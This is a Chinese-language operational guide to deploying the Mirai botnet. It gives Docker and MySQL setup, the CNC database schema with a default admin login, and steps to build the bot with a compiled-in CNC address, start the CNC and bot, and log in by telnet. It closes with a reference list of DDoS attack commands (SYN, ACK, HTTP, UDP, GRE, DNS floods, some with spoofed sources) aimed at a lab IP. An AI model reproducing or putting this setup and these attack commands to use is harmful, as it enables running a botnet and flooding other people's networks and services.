# 环境搭建



## mysql环境

1.已有的mysql环境

2.docker mysql环境



##### Docker

```shell
yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
yum install -y --setopt=obsoletes=0 docker-ce-18.06.1.ce-3.el7
```

##### 下载mysql镜像

```shell
docker pull mysql:5.7	
```



##### 初始化mirai数据库

方法一

***适用docker和非docker环境***

```
docker run -d -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 --name mirai_mysql  mysql:5.7
mysql -h192.168.137.120 -uroot -proot < mirai.sql
```

方法二

***需要提前将mirai.sql脚本映射进去***

```
docker run -d -e MYSQL_ROOT_PASSWORD=root -p 3306:3306  -v /home/lvsj/mirai.sql:/root/mirai.sql --name mirai_mysql  mysql:5.7
docker exec mirai_mysql mysql -uroot -proot < /root/mirai.sql
```



mirai.sql内容复制出来保存成文件

```sql
CREATE DATABASE mirai;
use mirai;
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);

CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);

CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

INSERT INTO users VALUES (NULL, 'mirai', 'mirai', 0, 0, 0, 0, -1, 1, 30, 'abcdef');
```



GO环境，

现在是编译好的  x86_64 架构的cnc, 有需要其他架构的再重新编译

```

```



bot

cnc的地址，需要根据实际cnc的地址进行调整后，重新编译。（后面，我看能不能做个可配的）

```shell
./buid.sh debug telnet
```



# 启动



## 启动cnc

```
#增加可以指定的mysql参数功能 --help 
sudo ./mirai-cnc -h 192.168.137.120 -u root -p root
```



## 启动bot

```
./debug/mirai.dbg
```



# 登录cnc

```
telnet cnc_ip
user: mirai
password:mirai
```

cnc命令参考 

```
?
syn 192.168.179.166 15 syn=1 source=255.255.255.255 dport=80
syn 192.168.179.166 15 syn=1 source=255.255.255.255 
http 192.168.179.166 15 domain=192.168.179.166 method=Get conns=10
ack 192.168.179.166 15 ack=1 source=255.255.255.255
stomp 192.168.179.166 dport=80 len=512 rand=1
udpplain 192.168.179.166 len=512 rand=1
udp 192.168.179.166 len=512 rand=1 source=255.255.255.255
vse 192.168.179.166
greip 192.168.179.166 len=512 rand=1 source=255.255.255.255
greeth 192.168.179.166 len=512 rand=1 source=255.255.255.255
dns 192.168.179.166 domain=www.baidu.com
```



